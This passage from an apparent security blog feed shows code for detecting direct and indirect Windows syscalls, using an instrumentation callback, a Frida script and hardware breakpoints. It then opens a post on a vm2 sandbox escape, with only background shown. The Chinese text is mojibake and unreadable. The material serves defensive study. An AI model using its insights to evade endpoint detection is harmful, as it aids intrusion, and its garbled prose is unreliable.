<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">VOID <span class="title">InstrumentationCallback</span><span class="params">(CONTEXT *context)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	ULONG_PTR pTEB = (ULONG_PTR)<span class="built_in">NtCurrentTeb</span>();</span><br><span class="line"></span><br><span class="line">	context-&gt;Rip = *((ULONG_PTR*)(pTEB + <span class="number">0x02D8</span>)); <span class="comment">// TEB-&gt;InstrumentationCallbackPreviousPc</span></span><br><span class="line">	context-&gt;Rsp = *((ULONG_PTR*)(pTEB + <span class="number">0x02E0</span>)); <span class="comment">// TEB-&gt;InstrumentationCallbackPreviousSp</span></span><br><span class="line">	context-&gt;Rcx = context-&gt;R10;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Prevent recursion TEB-&gt;InstrumentationCallbackDisabled</span></span><br><span class="line">	BOOLEAN bInstrumentationCallbackDisabled = *((BOOLEAN*)pTEB + <span class="number">0x1b8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!bInstrumentationCallbackDisabled) &#123;</span><br><span class="line">		bInstrumentationCallbackDisabled = TRUE;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Do whatever you want</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">		<span class="comment">// Enabling so we can catch next callback.</span></span><br><span class="line">		bInstrumentationCallbackDisabled = FALSE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">RtlRestoreContext</span>(context, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">SetInstrumentationCallback</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    PROCESS_INSTRUMENTATION_CALLBACK_INFORMATION Callback = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    HANDLE hProcess = <span class="built_in">GetCurrentProcess</span>();</span><br><span class="line">    NTSTATUS Status = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">    Callback.Version = <span class="number">0</span>;</span><br><span class="line">    Callback.Reserved = <span class="number">0</span>;</span><br><span class="line">    Callback.Callback = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    HMODULE hNtdll = <span class="built_in">GetModuleHandleA</span>(<span class="string">&quot;ntdll&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (hNtdll == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    pNtSetInformationProcess NtSetInformationProcess = (pNtSetInformationProcess)<span class="built_in">GetProcAddress</span>(hNtdll, <span class="string">&quot;NtSetInformationProcess&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (NtSetInformationProcess == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Status = <span class="built_in">NtSetInformationProcess</span>(</span><br><span class="line">        hProcess,</span><br><span class="line">        (PROCESS_INFORMATION_CLASS)ProcessInstrumentationCallback,</span><br><span class="line">        &amp;Callback,</span><br><span class="line">        <span class="built_in">sizeof</span>(Callback)</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">NT_SUCCESS</span>(Status))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> TRUE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/posts/973bd040/3.png" alt="img"></p>
<p>åœ¨ä»¥ä¸‹å‡ ç§æƒ…å†µä¸‹ InstrumentationCallbackä¸ä¼šäº§ç”Ÿä»»ä½•ç»“æœ</p>
<ul>
<li>NtTerminateProcess å’Œ NtTerminateThread (å¦‚æœæ˜¯è°ƒç”¨è‡ªèº«)</li>
</ul>
<p>è°ƒç”¨æ–¹ä¸ä¼šä»è¿™äº›è°ƒç”¨ä¸­è¿”å›</p>
<ul>
<li>NtContinue</li>
</ul>
<p>è¯¥å‡½æ•°æ¥å—æä¾›çš„ä¸Šä¸‹æ–‡å‚æ•°ï¼Œå¹¶ç›´æ¥åº”ç”¨äºå½“å‰é™·é˜±å¸§ trap frameï¼Œç„¶åä¸ä½¿ç”¨KeSystemServiceExitæ‰§è¡ŒIRET</p>
<ul>
<li>NtRaiseExeception</li>
</ul>
<p>å’ŒNtContinueç±»ä¼¼ï¼Œè¯¥å‡½æ•°æ¥å—æä¾›çš„ä¸Šä¸‹æ–‡å‚æ•°ï¼Œå¹¶å°†å…¶åº”ç”¨äºå½“å‰é™·é˜±å¸§ trap frameï¼Œä½†æ˜¯ï¼Œå¦‚æœæ²¡æœ‰å¤„ç† KiUserExceptionDispatcherï¼Œé‚£ä¹ˆå°†è°ƒç”¨å®ƒï¼Œä»è€Œç»™äºˆæˆ‘ä»¬æ‹¦æˆªçš„æœºä¼šã€‚</p>
<hr>
<h4 id="åˆ©ç”¨fridaå¯¹syscallè¿›è¡Œæ£€æµ‹"><a href="#åˆ©ç”¨fridaå¯¹syscallè¿›è¡Œæ£€æµ‹" class="headerlink" title="åˆ©ç”¨fridaå¯¹syscallè¿›è¡Œæ£€æµ‹"></a>åˆ©ç”¨fridaå¯¹syscallè¿›è¡Œæ£€æµ‹</h4><p><a href="https://passthehashbrowns.github.io/detecting-direct-syscalls-with-frida">https://passthehashbrowns.github.io/detecting-direct-syscalls-with-frida</a></p>
<p>pip3 install frida</p>
<p>pip3 install frida-tools</p>
<p>å®‰è£…å®Œæˆåå¯ä»¥ä½¿ç”¨frida-psæ£€æµ‹</p>
<p>frida C:\Users\test\Desktop\Syscall-Main\SyscallDemo\x64\Debug\SyscallDemo_calc.exe  -l 1.js</p>
<p><img src="/posts/973bd040/4.png" alt="img"></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> modules = <span class="title class_">Process</span>.<span class="title function_">enumerateModules</span>()</span><br><span class="line"><span class="keyword">var</span> ntdll = modules[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> ntdllBase = ntdll.<span class="property">base</span></span><br><span class="line"><span class="title function_">send</span>(<span class="string">&quot;[*] Ntdll base: &quot;</span> + ntdllBase)</span><br><span class="line"><span class="keyword">var</span> ntdllOffset = ntdllBase.<span class="title function_">add</span>(ntdll.<span class="property">size</span>)</span><br><span class="line"><span class="title function_">send</span>(<span class="string">&quot;[*] Ntdll end: &quot;</span> + ntdllOffset)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> mainThread = <span class="title class_">Process</span>.<span class="title function_">enumerateThreads</span>()[<span class="number">0</span>];</span><br><span class="line"><span class="title class_">Process</span>.<span class="title function_">enumerateThreads</span>().<span class="title function_">map</span>(<span class="function"><span class="params">t</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="title class_">Stalker</span>.<span class="title function_">follow</span>(t.<span class="property">id</span>, &#123;</span><br><span class="line">    <span class="attr">events</span>: &#123;</span><br><span class="line">      <span class="attr">call</span>: <span class="literal">false</span>, <span class="comment">// CALL instructions: yes please</span></span><br><span class="line">      <span class="comment">// Other events:</span></span><br><span class="line">      <span class="attr">ret</span>: <span class="literal">false</span>, <span class="comment">// RET instructions</span></span><br><span class="line">      <span class="attr">exec</span>: <span class="literal">false</span>, <span class="comment">// all instructions: not recommended as it&#x27;s</span></span><br><span class="line">      <span class="comment">//                   a lot of data</span></span><br><span class="line">      <span class="attr">block</span>: <span class="literal">false</span>, <span class="comment">// block executed: coarse execution trace</span></span><br><span class="line">      <span class="attr">compile</span>: <span class="literal">false</span> <span class="comment">// block compiled: useful for coverage</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="title function_">onReceive</span>(<span class="params">events</span>) &#123;    </span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="title function_">transform</span>(<span class="params">iterator</span>)&#123;</span><br><span class="line">      <span class="keyword">let</span> instruction = iterator.<span class="title function_">next</span>()</span><br><span class="line">      <span class="keyword">do</span>&#123;</span><br><span class="line">        <span class="comment">//I think this reduces overhead</span></span><br><span class="line">        <span class="keyword">if</span>(instruction.<span class="property">mnemonic</span> == <span class="string">&quot;mov&quot;</span>)&#123;</span><br><span class="line">          <span class="comment">//Should provide a good filter for syscalls, might need further filtering</span></span><br><span class="line">          <span class="keyword">if</span>(instruction.<span class="title function_">toString</span>() == <span class="string">&quot;mov r10, rcx&quot;</span>)&#123;</span><br><span class="line">            iterator.<span class="title function_">keep</span>() <span class="comment">//keep the instruction</span></span><br><span class="line">            instruction = iterator.<span class="title function_">next</span>() <span class="comment">//next instruction should have the syscall number</span></span><br><span class="line">            <span class="comment">//This helps to clear up some false positives</span></span><br><span class="line">            <span class="keyword">if</span>(instruction.<span class="title function_">toString</span>().<span class="title function_">split</span>(<span class="string">&#x27;,&#x27;</span>)[<span class="number">0</span>] == <span class="string">&quot;mov eax&quot;</span>)&#123;</span><br><span class="line">              <span class="keyword">var</span> addrInt = instruction.<span class="property">address</span>.<span class="title function_">toInt32</span>()</span><br><span class="line">              <span class="comment">//If the syscall is coming from somewhere outside the bounds of NTDLL</span></span><br><span class="line">              <span class="comment">//then it may be malicious</span></span><br><span class="line">              <span class="keyword">if</span>(addrInt &lt; ntdllBase.<span class="title function_">toInt32</span>() || addrInt &gt; ntdllOffset.<span class="title function_">toInt32</span>())&#123;</span><br><span class="line">                <span class="title function_">send</span>(<span class="string">&quot;[+] Found a potentially malicious syscall: &quot;</span> + instruction.<span class="title function_">toString</span>())</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        iterator.<span class="title function_">keep</span>()</span><br><span class="line">      &#125; <span class="keyword">while</span> ((instruction = iterator.<span class="title function_">next</span>()) !== <span class="literal">null</span>)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>



<h4 id="HWBP"><a href="#HWBP" class="headerlink" title="HWBP"></a>HWBP</h4><p>åœ¨syscall/ret å¤„è®¾ç½®ä¸€ä¸ªç¡¬ä»¶æ–­ç‚¹ï¼Œ å°†é—´æ¥ç³»ç»Ÿè°ƒç”¨ ç”¨ call/jmp åˆ°æˆ‘ä»¬çš„æŒ‡ä»¤ã€‚</p>
<p>å¦‚æœå®ƒæ¥è‡ª kernel32ã€kernelbase è¯´æ˜æ˜¯ä¸€ä¸ªåˆæ³•å‡½æ•° å¦åˆ™ä¸ºéæ³•syscall</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//https://fool.ish.wtf/2022/11/detecting-indirect-syscalls.html</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;c_syscalls.h&quot;</span> <span class="comment">// janoglezcampos/c_syscalls</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SINGLE_STEP_COUNT 2</span></span><br><span class="line"></span><br><span class="line"><span class="type">uintptr_t</span> k32_h;</span><br><span class="line"><span class="type">uintptr_t</span> kb_h;</span><br><span class="line">DWORD k32_s;</span><br><span class="line">DWORD kb_s;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">uintptr_t</span> <span class="title">find_gadget</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">	_In_ <span class="type">const</span> <span class="type">uintptr_t</span> function,</span></span></span><br><span class="line"><span class="params"><span class="function">	_In_ <span class="type">const</span> BYTE* stub,</span></span></span><br><span class="line"><span class="params"><span class="function">	_In_ <span class="type">const</span> UINT size</span></span></span><br><span class="line"><span class="params"><span class="function">)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">unsigned</span> <span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">25u</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="built_in">memcmp</span>((LPVOID)(function + i), stub, size) == <span class="number">0</span>) &#123;</span><br><span class="line">			<span class="keyword">return</span> (function + i);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">set_hardware_breakpoint</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">	_In_ <span class="type">const</span> DWORD tid,</span></span></span><br><span class="line"><span class="params"><span class="function">	_In_ <span class="type">const</span> <span class="type">uintptr_t</span> address,</span></span></span><br><span class="line"><span class="params"><span class="function">	_In_ <span class="type">const</span> UINT pos,</span></span></span><br><span class="line"><span class="params"><span class="function">	_In_ <span class="type">const</span> BOOL init</span></span></span><br><span class="line"><span class="params"><span class="function">)</span> </span>&#123;</span><br><span class="line">	CONTEXT context = &#123; .ContextFlags = CONTEXT_DEBUG_REGISTERS &#125;;</span><br><span class="line"></span><br><span class="line">	HANDLE thd = INVALID_HANDLE_VALUE;</span><br><span class="line"></span><br><span class="line">	BOOL res = FALSE;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (tid == <span class="built_in">GetCurrentThreadId</span>())</span><br><span class="line">	&#123;</span><br><span class="line">		thd = <span class="built_in">GetCurrentThread</span>();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		thd = <span class="built_in">OpenThread</span>(THREAD_ALL_ACCESS, FALSE, tid);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	res = <span class="built_in">GetThreadContext</span>(thd, &amp;context);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (init &amp;&amp; res)</span><br><span class="line">	&#123;</span><br><span class="line">		(&amp;context.Dr0)[pos] = address;</span><br><span class="line">		context.Dr7 &amp;= ~(<span class="number">3ull</span> &lt;&lt; (<span class="number">16</span> + <span class="number">4</span> * pos));</span><br><span class="line">		context.Dr7 &amp;= ~(<span class="number">3ull</span> &lt;&lt; (<span class="number">18</span> + <span class="number">4</span> * pos));</span><br><span class="line">		context.Dr7 |= <span class="number">1ull</span> &lt;&lt; (<span class="number">2</span> * pos);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> ((&amp;context.Dr0)[pos] == address)</span><br><span class="line">		&#123;</span><br><span class="line">			context.Dr7 &amp;= ~(<span class="number">1ull</span> &lt;&lt; (<span class="number">2</span> * pos));</span><br><span class="line">			(&amp;context.Dr0)[pos] = <span class="number">0ull</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	res = <span class="built_in">SetThreadContext</span>(thd, &amp;context);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (thd != INVALID_HANDLE_VALUE) <span class="built_in">CloseHandle</span>(thd);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">LONG WINAPI <span class="title">exception_handler</span><span class="params">(<span class="type">const</span> PEXCEPTION_POINTERS ExceptionInfo)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (ExceptionInfo-&gt;ExceptionRecord-&gt;ExceptionCode == STATUS_SINGLE_STEP)</span><br><span class="line"></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="type">static</span>  <span class="type">unsigned</span> <span class="type">short</span> count = SINGLE_STEP_COUNT;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (count &gt; <span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			ExceptionInfo-&gt;ContextRecord-&gt;EFlags |= <span class="number">1</span> &lt;&lt; <span class="number">8</span>; <span class="comment">// TF</span></span><br><span class="line">			count--;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> (count == <span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;[%u] syscall -&gt; ret -&gt; 0x%p\n&quot;</span>, count, (PVOID)ExceptionInfo-&gt;ContextRecord-&gt;Rip);</span><br><span class="line"></span><br><span class="line">			<span class="type">uintptr_t</span> address = ExceptionInfo-&gt;ContextRecord-&gt;Rip;</span><br><span class="line"></span><br><span class="line">			BOOL legit = FALSE;</span><br><span class="line"></span><br><span class="line">			<span class="comment">// syscall -&gt; ret -&gt; ...</span></span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (address &gt;= k32_h &amp;&amp; address &lt;= k32_h + k32_s || address &gt;= kb_h &amp;&amp; address &lt;= kb_h + kb_s)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="comment">// check opcode is not ret opcode</span></span><br><span class="line">				<span class="type">char</span> opcode = *(<span class="type">char</span>*)ExceptionInfo-&gt;ContextRecord-&gt;Rip;</span><br><span class="line"></span><br><span class="line">				<span class="keyword">if</span> (opcode != <span class="number">0xC3</span> &amp;&amp; opcode != <span class="number">0xCB</span> &amp;&amp; opcode != <span class="number">0xC2</span> &amp;&amp; opcode != <span class="number">0xCA</span>)</span><br><span class="line">					legit = TRUE;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;\n[+] %s SYSCALL DETECTED\n\n&quot;</span>, legit ? <span class="string">&quot;LEGIT&quot;</span> : <span class="string">&quot;INDIRECT&quot;</span>);</span><br><span class="line"></span><br><span class="line">			count = SINGLE_STEP_COUNT;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		ExceptionInfo-&gt;ContextRecord-&gt;EFlags |= <span class="number">1</span> &lt;&lt; <span class="number">16</span>; <span class="comment">// RF</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> EXCEPTION_CONTINUE_EXECUTION;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">test_thread</span><span class="params">(_In_ LPVOID lpParameter)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">uintptr_t</span> <span class="title">set_module_values</span><span class="params">(_In_ <span class="type">uintptr_t</span> <span class="keyword">module</span>, _Out_ DWORD* size)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(<span class="keyword">module</span> + ((PIMAGE_DOS_HEADER)<span class="keyword">module</span>)-&gt;e_lfanew);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; nt-&gt;FileHeader.NumberOfSections; i++) &#123;</span><br><span class="line"></span><br><span class="line">		<span class="type">const</span> PIMAGE_SECTION_HEADER section = (PIMAGE_SECTION_HEADER)((DWORD_PTR)<span class="built_in">IMAGE_FIRST_SECTION</span>(nt) + (DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> ((*(ULONG*)section-&gt;Name | <span class="number">0x20202020</span>) == <span class="string">&#x27;xet.&#x27;</span>) &#123;</span><br><span class="line"></span><br><span class="line">			ULONG dw;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">module</span> = <span class="keyword">module</span> + section-&gt;VirtualAddress;</span><br><span class="line"></span><br><span class="line">			*size = section-&gt;Misc.VirtualSize;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">module</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Register our exception handler</span></span><br><span class="line"></span><br><span class="line">	<span class="type">const</span> PVOID handler = <span class="built_in">AddVectoredExceptionHandler</span>(<span class="number">1</span>, exception_handler);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Set the global values of the DLL .text sections VA and SZ</span></span><br><span class="line"></span><br><span class="line">	k32_h = <span class="built_in">set_module_values</span>(<span class="built_in">GetModuleHandleA</span>(<span class="string">&quot;KERNEL32.dll&quot;</span>), &amp;k32_s);</span><br><span class="line"></span><br><span class="line">	kb_h = <span class="built_in">set_module_values</span>(<span class="built_in">GetModuleHandleA</span>(<span class="string">&quot;KERNELBASE.dll&quot;</span>), &amp;kb_s);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Find address to breakpoint on and set it.</span></span><br><span class="line"></span><br><span class="line">	<span class="type">const</span> <span class="type">uintptr_t</span> syscall_address1 = <span class="built_in">find_gadget</span>(<span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandleA</span>(<span class="string">&quot;NTDLL.dll&quot;</span>), <span class="string">&quot;NtTestAlert&quot;</span>), <span class="string">&quot;\x0F\x05&quot;</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">set_hardware_breakpoint</span>(<span class="built_in">GetCurrentThreadId</span>(), syscall_address1, <span class="number">1</span>, TRUE);</span><br><span class="line"></span><br><span class="line">	<span class="type">const</span> <span class="type">uintptr_t</span> syscall_address2 = <span class="built_in">find_gadget</span>(<span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandleA</span>(<span class="string">&quot;NTDLL.dll&quot;</span>), <span class="string">&quot;NtCreateThreadEx&quot;</span>), <span class="string">&quot;\x0F\x05&quot;</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">set_hardware_breakpoint</span>(<span class="built_in">GetCurrentThreadId</span>(), syscall_address2, <span class="number">2</span>, TRUE);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Test cases</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[-] Testing indirect syscall.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	NTSTATUS status = <span class="built_in">Syscall</span>(NT_TEST_ALERT);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[-] Testing legitimate syscall.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">const</span> HANDLE t = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, test_thread, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (t) &#123;</span><br><span class="line"></span><br><span class="line">		<span class="built_in">WaitForSingleObject</span>(t, INFINITE); <span class="built_in">CloseHandle</span>(t);</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Disable the hardware breakpoint</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">set_hardware_breakpoint</span>(<span class="built_in">GetCurrentThreadId</span>(), syscall_address1, <span class="number">1</span>, FALSE);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">set_hardware_breakpoint</span>(<span class="built_in">GetCurrentThreadId</span>(), syscall_address2, <span class="number">2</span>, FALSE);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Remove our registered VEH</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (handler != <span class="literal">NULL</span>) <span class="built_in">RemoveVectoredExceptionHandler</span>(handler);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><p><a href="https://winternl.com/detecting-manual-syscalls-from-user-mode/">https://winternl.com/detecting-manual-syscalls-from-user-mode/</a></p>
<p><a href="https://pre.empt.blog/2022/implementing-syscall-detection-into-fennec">https://pre.empt.blog/2022/implementing-syscall-detection-into-fennec</a>  </p>
<p><a href="https://www.codeproject.com/Articles/543542/Windows-x64-system-service-hooks-and-advanced-debu">https://www.codeproject.com/Articles/543542/Windows-x64-system-service-hooks-and-advanced-debu</a></p>
<p><a href="https://passthehashbrowns.github.io/detecting-direct-syscalls-with-frida">https://passthehashbrowns.github.io/detecting-direct-syscalls-with-frida</a></p>
]]></content>
      <categories>
        <category>syscall</category>
      </categories>
      <tags>
        <tag>syscall</tag>
      </tags>
  </entry>
  <entry>
    <title>nodejsä¸‹vm2æ²™ç®±é€ƒé€¸</title>
    <url>/posts/bfeb5984/</url>
    <content><![CDATA[<p>node.js  è¿è¡Œåœ¨æœåŠ¡ç«¯çš„JavaScriptï¼Œæ˜¯ä¸€ä¸ªåŸºäºChrome JavaScriptè¿è¡Œæ—¶å»ºç«‹çš„å¹³å°ï¼ŒåŸºäºGoogle V8å¼•æ“ã€‚</p>
<p>vm2æ²™ç®± æ˜¯ä¸€ä¸ªç‹¬ç«‹ çš„ç¯å¢ƒï¼Œä¸»è¦è¿è¡Œä¸€äº›ä¸å—ä¿¡ä»»çš„ä»£ç ï¼Œä»¥å‡è½»æ¶æ„ä»£ç å½±å“è¿è¡Œä»£ç çš„ä¸»æœºçš„é£é™©ã€‚è™½ç„¶æ²™ç®±ä½œä¸ºéš”ç¦»æœºåˆ¶éå¸¸æœ‰ç”¨ï¼Œä½†æ˜¯éœ€è¦è°¨æ…ä½¿ç”¨ï¼Œå› ä¸º å­˜åœ¨ä¸€äº›æ²™ç®±é€ƒé€¸å¯ä»¥ç»•è¿‡è¿™äº›é™åˆ¶ã€‚vm2 æœªå¤„ç†çš„å¼‚æ­¥é”™è¯¯æ—¶ä¸èƒ½æ­£ç¡®åœ°ä¼ é€’å‚æ•°ç»™ Error.pareStackTraceçš„å¯¹è±¡ï¼ˆsstï¼‰é€ æˆæ²™ç®±ç»•è¿‡ï¼Œä»è€Œé€ æˆè¿œç¨‹ä»£ç æ‰§è¡Œ</p>
<h3 id="å‰ç½®çŸ¥è¯†"><a href="#å‰ç½®çŸ¥è¯†" class="headerlink" title="å‰ç½®çŸ¥è¯†"></a>å‰ç½®çŸ¥è¯†</h3><p>ä¹‹å‰æ²¡å­¦ä¹ è¿‡js å…¶ä¸­es6è¿™å—ä¹Ÿæ›´æ˜¯æ²¡å¬è¯´è¿‡ æ‰€ä»¥åœ¨ç›´æ¥çœ‹ä»£ç çš„æ—¶å€™æœ‰æ¯”è¾ƒå¤§çš„å›°æƒ‘ï¼Œåé¢çœ‹äº†ä¸‹ä¸€äº›ç›¸å…³æ–‡æ¡£ï¼Œä¸»è¦è®°å½•å‡ ä¸ªä¸‹é¢ä¼šç”¨å¾—åˆ°çš„ä¸œè¥¿</p>
<h4 id="JavaScriptç›¸å…³"><a href="#JavaScriptç›¸å…³" class="headerlink" title="JavaScriptç›¸å…³"></a>JavaScriptç›¸å…³</h4><h5 id="let-var-const"><a href="#let-var-const" class="headerlink" title="let/var/const"></a>let/var/const</h5><p>let å—çº§ä½œç”¨åŸŸ å‡½æ•°å†…éƒ¨ä½¿ç”¨letå®šä¹‰å å¯¹å‡½æ•°å¤–éƒ¨æ— å½±å“</p>
<p>var å®šä¹‰çš„å˜é‡å¯ä»¥ä¿®æ”¹ å¦‚æœä¸åˆå§‹åŒ–ä¼šè¾“å‡ºundefined ä½†ä¸ä¼šæŠ¥é”™</p>
<p>const å®šä¹‰çš„å˜é‡ä¸å¯ä¿®æ”¹ ä¸”å¿…é¡»åˆå§‹åŒ–</p>
<p>es6ä¸­ constçš„ç®€å†™</p>
<p>const {xxx} = this.state   =&gt;   const xxx = this.state.xxx</p>
<p>const {aaa,bbb,ccc} =&gt;  this const aaa = this.aaa  const bbb = this.bbb const ccc =this.ccc</p>
<p>const {aaa:A , bbb:B } = this  ï¼Ÿ=&gt;   const A = this.aaa const B = this.B</p>
<p>async å¼‚æ­¥æ“ä½œç›¸å…³å…³é”®å­—</p>
<p>awaitåªèƒ½åœ¨ä»¥ä¸å«ç¨async functionå†…éƒ¨ä½¿ç”¨</p>
<p>asyncå‡½æ•°ä¸­å¯èƒ½ä¼šæœ‰awaitè¡¨è¾¾å¼ï¼Œå¦‚æœåœ¨asyncå‡½æ•°æ‰§è¡Œæ—¶ï¼Œé‡åˆ°awaitåå›æ˜¾æš‚åœæ‰§è¡Œï¼Œç­‰è§¦å‘çš„å¼‚æ­¥æ“ä½œå®Œæˆåï¼Œæ¢å¤asyncå‡½æ•°çš„æ‰§è¡Œå¹¶è¿”å›è§£æå€¼</p>
